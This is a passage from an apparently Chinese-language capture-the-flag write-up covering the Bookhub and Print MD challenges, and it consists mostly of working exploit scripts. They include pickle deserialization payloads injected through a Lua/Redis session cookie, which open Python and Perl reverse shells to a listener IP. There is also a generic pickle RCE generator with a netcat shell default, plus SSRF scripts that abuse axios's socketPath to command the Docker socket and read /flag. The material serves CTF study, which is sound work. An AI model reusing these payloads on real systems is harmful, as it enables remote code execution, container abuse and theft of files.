class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class exp(object):</span><br><span class=\"line\"></span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">        listen_ip = &quot;123.207.90.143&quot;</span><br><span class=\"line\">        listen_port = 1234</span><br><span class=\"line\">        s = &apos;python -c \\&apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;%s&quot;,%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);\\&apos;&apos; % (</span><br><span class=\"line\">            listen_ip, listen_port)</span><br><span class=\"line\">        return (os.system, (s,))</span><br><span class=\"line\"></span><br><span class=\"line\">x = [&#123;&apos;_fresh&apos;: False, &apos;_permanent&apos;: True,</span><br><span class=\"line\">      &apos;csrf_token&apos;: &apos;2f898d232024ac0e0fc5f5e6fdd3a9a7dad462e8&apos;, &apos;exp&apos;: exp()&#125;]</span><br><span class=\"line\">s = cPickle.dumps(x)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &apos;__main__&apos;:</span><br><span class=\"line\">    payload = urllib.quote(s)</span><br><span class=\"line\">    yoursid = &apos;vvv&apos;</span><br><span class=\"line\">    funcode = r&quot;local function urlDecode(s) s = string.gsub(s, &apos;%%(%x%x)&apos;, function(h) return string.char(tonumber(h, 16)) end) return s end&quot;</span><br><span class=\"line\">    # 插入payload并防止del</span><br><span class=\"line\">    sid = &apos;%s\\\\&quot; &#125; %s &apos; % (rs(6), funcode) + \\</span><br><span class=\"line\">        &apos;redis.call(\\\\&quot;set\\\\&quot;,\\\\&quot;bookhub:session:%s\\\\&quot;,\\\\urlDecode(&quot;%s\\\\&quot;)) inputs = &#123; \\&quot;bookhub:session:%s\\&quot; &#125; --&apos; % (</span><br><span class=\"line\">            yoursid, payload, yoursid)</span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        &quot;Cookie&quot;: &apos;bookhub-session=&quot;x%s&quot;&apos; % sid,</span><br><span class=\"line\">        &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class=\"line\">        &apos;X-CSRFToken&apos;: &apos;&apos;,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    res = req.get(URL + &apos;login/&apos;, headers=headers)</span><br><span class=\"line\">    if res.status_code == 200:</span><br><span class=\"line\">        html = res.content</span><br><span class=\"line\">        r = re.findall(r&apos;csrf_token&quot; type=&quot;hidden&quot; value=&quot;(.*?)&quot;&gt;&apos;, html)</span><br><span class=\"line\">        if r:</span><br><span class=\"line\">            headers[&apos;X-CSRFToken&apos;] = r[0]</span><br><span class=\"line\">            # refresh_session</span><br><span class=\"line\">            data = &#123;&apos;submit&apos;: &apos;1&apos;&#125;</span><br><span class=\"line\">            res = req.post(URL + &apos;admin/system/refresh_session/&apos;,</span><br><span class=\"line\">                           data=data, headers=headers)</span><br><span class=\"line\">            if res.status_code == 200:</span><br><span class=\"line\">                print(res.content)</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                print(res.content)</span><br><span class=\"line\">            # fuck</span><br><span class=\"line\">            headers[&apos;Cookie&apos;] = &apos;bookhub-session=vvv&apos;</span><br><span class=\"line\">            res = req.get(URL + &apos;admin/&apos;, headers=headers)</span><br><span class=\"line\">            if res.status_code == 200:</span><br><span class=\"line\">                print(res.content)</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                print(res.content)</span><br></pre></td></tr></table></figure>\n<p>payload2:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__AUTHOR__ = &apos;Virink&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">import os</span><br><span class=\"line\">import sys</span><br><span class=\"line\">import requests as req</span><br><span class=\"line\">import re</span><br><span class=\"line\">from urllib import quote as urlencode</span><br><span class=\"line\">try:</span><br><span class=\"line\">    import cPickle as pickle</span><br><span class=\"line\">except ImportError:</span><br><span class=\"line\">    import pickle</span><br><span class=\"line\"></span><br><span class=\"line\">URL = &quot;http://18.213.16.123:5000/&quot;</span><br><span class=\"line\">listen_ip = &apos;123.207.90.143&apos;</span><br><span class=\"line\">listen_port = 1234</span><br><span class=\"line\"></span><br><span class=\"line\">class exp(object):</span><br><span class=\"line\"></span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">        s = &quot;perl -e &apos;use Socket;$i=\\&quot;%s\\&quot;;$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\&quot;tcp\\&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\\&quot;&gt;&amp;S\\&quot;);open(STDOUT,\\&quot;&gt;&amp;S\\&quot;);open(STDERR,\\&quot;&gt;&amp;S\\&quot;);exec(\\&quot;/bin/sh -i\\&quot;);&#125;;&apos;&quot; % (listen_ip, listen_port)</span><br><span class=\"line\">        return (os.system, (s,))</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &apos;__main__&apos;:</span><br><span class=\"line\">    payload = urlencode(pickle.dumps([exp()]))</span><br><span class=\"line\">    # 插入payload并防止del</span><br><span class=\"line\">    sid = &apos;\\\\&quot; &#125; local function urlDecode(s) s=string.gsub(s,\\&apos;%%(%x%x)\\&apos;,function(h) return string.char(tonumber(h, 16)) end) return s end &apos; + \\</span><br><span class=\"line\">        &apos;redis.call(\\\\&quot;set\\\\&quot;,\\\\&quot;bookhub:session:qaq\\\\&quot;,urlDecode(\\\\&quot;%s\\\\&quot;)) inputs = &#123; \\&quot;bookhub:session:qaq\\&quot; &#125; --&apos; % (</span><br><span class=\"line\">            payload)</span><br><span class=\"line\">    headers = &#123;&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;</span><br><span class=\"line\">    # 注入payload</span><br><span class=\"line\">    headers[&quot;Cookie&quot;] = &apos;bookhub-session=&quot;%s&quot;&apos; % sid</span><br><span class=\"line\">    res = req.get(URL + &apos;login/&apos;, headers=headers)</span><br><span class=\"line\">    if res.status_code == 200:</span><br><span class=\"line\">        r = re.findall(r&apos;csrf_token&quot; type=&quot;hidden&quot; value=&quot;(.*?)&quot;&gt;&apos;,</span><br><span class=\"line\">                       res.content.decode(&apos;utf-8&apos;))</span><br><span class=\"line\">        if r:</span><br><span class=\"line\">            # refresh_session</span><br><span class=\"line\">            headers[&apos;X-CSRFToken&apos;] = r[0]</span><br><span class=\"line\">            data = &#123;&apos;submit&apos;: &apos;1&apos;&#125;</span><br><span class=\"line\">            res = req.post(URL + &apos;admin/system/refresh_session/&apos;,</span><br><span class=\"line\">                           data=data, headers=headers)</span><br><span class=\"line\">            if res.status_code == 200:</span><br><span class=\"line\">                # 触发RCE</span><br><span class=\"line\">                req.get(URL + &apos;login/&apos;,</span><br><span class=\"line\">                        headers=&#123;&apos;Cookie&apos;: &apos;bookhub-session=qaq&apos;&#125;)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>pickle payload生成</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/python</span><br><span class=\"line\">#</span><br><span class=\"line\"># Pickle deserialization RCE payload.</span><br><span class=\"line\"># To be invoked with command to execute at it&apos;s first parameter.</span><br><span class=\"line\"># Otherwise, the default one will be used.</span><br><span class=\"line\">#</span><br><span class=\"line\"></span><br><span class=\"line\">import cPickle</span><br><span class=\"line\">import os</span><br><span class=\"line\">import sys</span><br><span class=\"line\">import base64</span><br><span class=\"line\"></span><br><span class=\"line\">DEFAULT_COMMAND = &quot;netcat -c &apos;/bin/bash -i&apos; -l -p 4444&quot;</span><br><span class=\"line\">COMMAND = sys.argv[1] if len(sys.argv) &gt; 1 else DEFAULT_COMMAND</span><br><span class=\"line\"></span><br><span class=\"line\">class PickleRce(object):</span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">        return (os.system,(COMMAND,))</span><br><span class=\"line\"></span><br><span class=\"line\">print base64.b64encode(cPickle.dumps(PickleRce()))</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"Print-MD\"><a href=\"#Print-MD\" class=\"headerlink\" title=\"Print MD\"></a>Print MD</h3><ol>\n<li><p>subject description</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Make HackMD printable ._. http://54.183.55.10/</span><br><span class=\"line\"></span><br><span class=\"line\">Hint: If you are not skilled at black-box testing, you need to figure out how PrintMD is compatible with outdated browsers. Flag is in the filesystem /flag</span><br><span class=\"line\"></span><br><span class=\"line\">Hint: Here is a render.js for you.</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>render.js</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const &#123;Router&#125; = require(&apos;express&apos;)</span><br><span class=\"line\">const &#123;matchesUA&#125; = require(&apos;browserslist-useragent&apos;)</span><br><span class=\"line\">const router = Router()</span><br><span class=\"line\">const axios = require(&apos;axios&apos;)</span><br><span class=\"line\">const md = require(&apos;../../plugins/md_srv&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">router.post(&apos;/render&apos;, function (req, res, next) &#123;</span><br><span class=\"line\">  let ret = &#123;&#125;</span><br><span class=\"line\">  ret.ssr = !matchesUA(req.body.ua, &#123;</span><br><span class=\"line\">    browsers: [&quot;last 1 version&quot;, &quot;&gt; 1%&quot;, &quot;IE 10&quot;],</span><br><span class=\"line\">    _allowHigherVersions: true</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">  if (ret.ssr) &#123;</span><br><span class=\"line\">    axios(req.body.url).then(r =&gt; &#123;</span><br><span class=\"line\">          ret.mdbody = md.render(r.data)</span><br><span class=\"line\">      res.json(ret)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else &#123;</span><br><span class=\"line\">    ret.mdbody = md.render(&apos;# 请稍候…&apos;)</span><br><span class=\"line\">    res.json(ret)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">module.exports = router</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>漏洞</p>\n<p><strong>print.ba84889093b992d33112.js</strong>中可以找到将markdown文档发送到服务端解析的代码 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">validate: function(e) &#123;</span><br><span class=\"line\">    return e.query.url &amp;&amp; e.query.url.startsWith(&quot;https://hackmd.io/&quot;)</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">asyncData: function(ctx) &#123;</span><br><span class=\"line\">    if(!ctx.query.url.endsWith(&quot;/download&quot;))&#123;</span><br><span class=\"line\">        ctx.query.url += &quot;/download&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ctx.query.ua = ctx.req.headers[&quot;user-agent&quot;] || &quot;&quot;;</span><br><span class=\"line\">    return axios.post(&quot;/api/render&quot;, qs.stringify(&#123;...ctx.query&#125;)).then(function(e) &#123;</span><br><span class=\"line\">        return &#123;</span><br><span class=\"line\">            ...e.data,</span><br><span class=\"line\">            url: ctx.query.url</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">mounted: function() &#123;</span><br><span class=\"line\">    if (!this.ssr)&#123;</span><br><span class=\"line\">        axios(this.url).then(function(t) &#123;</span><br><span class=\"line\">            this.mdbody = md.render(t.data)</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里直接使用<code>qs.stringify({...ctx.query}</code>,因而在render.js中</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios(req.body.url).then(<span class=\"function\"><span class=\"params\">r</span> =&gt;</span> &#123;</span><br><span class=\"line\">    ret.mdbody = md.render(r.data)</span><br><span class=\"line\">    res.json(ret)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>req.body.url</code> 可控</p>\n</li>\n<li><p>漏洞利用</p>\n<p><strong>axios</strong>这个东西是不支持<strong>file://</strong>协议的，但是通过文档可知，他支持<strong>UNIX Socket</strong> 。</p>\n<p><img src=\"/assets/realworldctf/TIM截图20180802194917.png\" alt=\"\"></p>\n<p>测试<code>ping</code>。</p>\n<blockquote>\n<p>GET <a href=\"http://54.183.55.10/print?url[url]=/_ping&amp;url[socketPath]=/var/run/docker.sock&amp;url=https://hackmd.io/\" target=\"_blank\" rel=\"noopener\">http://54.183.55.10/print?url[url]=/_ping&amp;url[socketPath]=/var/run/docker.sock&amp;url=https://hackmd.io/</a> HTTP/1.1</p>\n</blockquote>\n<p><img src=\"/assets/realworldctf/TIM截图20180802195456.png\" alt=\"\"></p>\n</li>\n<li><p>exploit.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests <span class=\"keyword\">as</span> req</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</span><br><span class=\"line\"><span class=\"keyword\">from</span> urllib <span class=\"keyword\">import</span> quote <span class=\"keyword\">as</span> urlencode</span><br><span class=\"line\"></span><br><span class=\"line\">URL = <span class=\"string\">\"http://54.183.55.10/print?&#123;url&#125;&amp;url=https%3A%2F%2Fhackmd.io%2Fvbz2j6hkR9CIgABjEbRrzQ\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">\"User-Agent\"</span>: <span class=\"string\">\"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(u)</span>:</span></span><br><span class=\"line\">    res = req.get(u, timeout=<span class=\"number\">10</span>, headers=headers)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> res.status_code == <span class=\"number\">200</span>:</span><br><span class=\"line\">        soup = BeautifulSoup(res.content, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">        body = soup.select(<span class=\"string\">\".markdown-body\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> body:</span><br><span class=\"line\">            print(body[<span class=\"number\">0</span>].text)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">True</span></span><br><span class=\"line\">    print(<span class=\"string\">\"[-] error\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fuck</span><span class=\"params\">(_u)</span>:</span></span><br><span class=\"line\">    _u += <span class=\"string\">'&amp;url[socketPath]=/var/run/docker.sock'</span></span><br><span class=\"line\">    pl = URL.format(url=_u)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        get(pl)</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    container_name = <span class=\"string\">''</span>.join(random.sample(</span><br><span class=\"line\">        string.ascii_letters + string.digits, <span class=\"number\">6</span>))</span><br><span class=\"line\">    _us = [</span><br><span class=\"line\">        <span class=\"string\">'url[url]=/_ping&amp;'</span>,</span><br><span class=\"line\">        <span class=\"string\">'url[method]=post&amp;url[url]=http://127.0.0.1/assets/create?fromImage=alpine:latest'</span>,</span><br><span class=\"line\">        <span class=\"string\">'url[method]=post&amp;url[url]=http://127.0.0.1/containers/create?name=%s&amp;url[data][Image]=alpine:latest&amp;url[data][Volumes][flag][path]=/getflag&amp;url[data][Binds][]=/flag:/getflag:ro&amp;url[data][Entrypoint][]=/bin/ls'</span> % container_name,</span><br><span class=\"line\">        <span class=\"string\">'url[method]=post&amp;url[url]=http://127.0.0.1/containers/%s/start'</span> % container_name,</span><br><span class=\"line\">        <span class=\"string\">'url[method]=get&amp;url[url]=http://127.0.0.1/containers/%s/archive?path=/getflag'</span> % container_name</span><br><span class=\"line\">    ]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> _us:</span><br><span class=\"line\">        fuck(i)</span><br></pre></td></tr></table></figure>\n<p>exploit1.py</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\">#</span><br><span class=\"line\"># SakiiR @ Hexpresso</span><br><span class=\"line\"># cc XeR &amp; BitK</span><br><span class=\"line\"># Let&apos;s go now (:</span><br><span class=\"line\">#</span><br><span class=\"line\"># --+ Python 2 +--</span><br><span class=\"line\"></span><br><span class=\"line\">import random</span><br><span class=\"line\">import pwn</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import urllib</span><br><span class=\"line\"></span><br><span class=\"line\">urlencode = urllib.quote_plus</span><br><span class=\"line\"></span><br><span class=\"line\">OUTFILE = &quot;flag.txt&quot;</span><br><span class=\"line\">MAX_ROWS = 100</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def random_container_name(n=10, charset=(&quot;abcdefghijklmnopqrstUVWXYZ&quot;</span><br><span class=\"line\">                                         &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class=\"line\">                                         &quot;0123456789&quot;)):</span><br><span class=\"line\">    return &apos;&apos;.join([</span><br><span class=\"line\">        charset[random.randint(0, len(charset) - 1)] for _ in range(n)</span><br><span class=\"line\">    ])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def main():</span><br><span class=\"line\"></span><br><span class=\"line\">    container_name = random_container_name()</span><br><span class=\"line\">    pwn.log.info(&quot;Your container name is &apos;&#123;&#125;&apos;&quot;.format(container_name))</span><br><span class=\"line\"></span><br><span class=\"line\">    # Pull alpine image :)</span><br><span class=\"line\">    # --------------------</span><br><span class=\"line\">    endpoint = urlencode(&quot;http://127.0.0.1/assets/create?fromImage=alpine:latest&quot;)</span><br><span class=\"line\">    url = (&apos;http://54.183.55.10/print&apos;</span><br><span class=\"line\">           &apos;?url[method]=POST&apos;</span><br><span class=\"line\">           &apos;&amp;url[url]=&#123;&#125;&apos;</span><br><span class=\"line\">           &apos;&amp;url[socketPath]=/var/run/docker.sock&apos;</span><br><span class=\"line\">           &apos;&amp;url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download&apos;).format(endpoint)</span><br><span class=\"line\">    pwn.log.info(&quot;Pulling alpine:      &apos;&#123;&#125;[...]&apos;&quot;.format(url[:MAX_ROWS]))</span><br><span class=\"line\">    r = requests.get(url)</span><br><span class=\"line\">    pwn.log.info(&quot;Response: &#123;&#125;&quot;.format(r.status_code))</span><br><span class=\"line\"></span><br><span class=\"line\">    # Creating container (image)</span><br><span class=\"line\">    # --------------------------</span><br><span class=\"line\">    endpoint = urlencode(&apos;http://127.0.0.1/containers/create?name=&#123;&#125;&apos;.format(container_name))</span><br><span class=\"line\">    url = (&apos;http://54.183.55.10/print&apos;</span><br><span class=\"line\">           &apos;?url[method]=POST&apos;</span><br><span class=\"line\">           &apos;&amp;url[url]=&#123;&#125;&apos;</span><br><span class=\"line\">           &apos;&amp;url[data][Volumes][flag][path]=/sakiir&apos;</span><br><span class=\"line\">           &apos;&amp;url[data][Binds][]=/flag:/sakiir:ro&apos;</span><br><span class=\"line\">           &apos;&amp;url[data][Entrypoint][]=/bin/sh&apos;</span><br><span class=\"line\">           &apos;&amp;url[data][Image]=alpine:latest&apos;</span><br><span class=\"line\">           &apos;&amp;url[socketPath]=/var/run/docker.sock&apos;</span><br><span class=\"line\">           &apos;&amp;url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download&apos;).format(endpoint)</span><br><span class=\"line\">    pwn.log.info(&quot;Creating container:  &apos;&#123;&#125;[...]&apos;&quot;.format(url[:MAX_ROWS]))</span><br><span class=\"line\">    pwn.log.info(&quot;This will take some time then crash with a 503&quot;)</span><br><span class=\"line\">    pwn.log.info(&quot;The container will still be created (:&quot;)</span><br><span class=\"line\">    r = requests.get(url)</span><br><span class=\"line\">    pwn.log.info(&quot;Response: &#123;&#125;&quot;.format(r.status_code))</span><br><span class=\"line\"></span><br><span class=\"line\">    # Starting container_name</span><br><span class=\"line\">    # -----------------------</span><br><span class=\"line\">    endpoint = urlencode(&apos;http://127.0.0.1/containers/&#123;&#125;/start&apos;.format(container_name))</span><br><span class=\"line\">    url = (&apos;http://54.183.55.10/print&apos;</span><br><span class=\"line\">           &apos;?url[method]=POST&apos;</span><br><span class=\"line\">           &apos;&amp;url[url]=&#123;&#125;&apos;</span><br><span class=\"line\">           &apos;&amp;url[socketPath]=/var/run/docker.sock&apos;</span><br><span class=\"line\">           &apos;&amp;url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download&apos;).format(endpoint)</span><br><span class=\"line\">    pwn.log.info(&quot;Starting container:  &apos;&#123;&#125;[...]&apos;&quot;.format(url[:MAX_ROWS]))</span><br><span class=\"line\">    r = requests.get(url)</span><br><span class=\"line\">    pwn.log.info(&quot;Response: &#123;&#125;&quot;.format(r.status_code))</span><br><span class=\"line\"></span><br><span class=\"line\">    # Archive container (Archive the /sakiir directory and get it back :))</span><br><span class=\"line\">    # --------------------------------------------------------------------</span><br><span class=\"line\">    endpoint = urlencode(&quot;http://127.0.0.1/containers/&#123;&#125;/archive?path=/sakiir&quot;.format(container_name))</span><br><span class=\"line\">    url = (&apos;http://54.183.55.10/print&apos;</span><br><span class=\"line\">           &apos;?url[method]=GET&apos;</span><br><span class=\"line\">           &apos;&amp;url[url]=&#123;&#125;&apos;</span><br><span class=\"line\">           &apos;&amp;url[socketPath]=/var/run/docker.sock&apos;</span><br><span class=\"line\">           &apos;&amp;url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download&apos;).format(endpoint)</span><br><span class=\"line\">   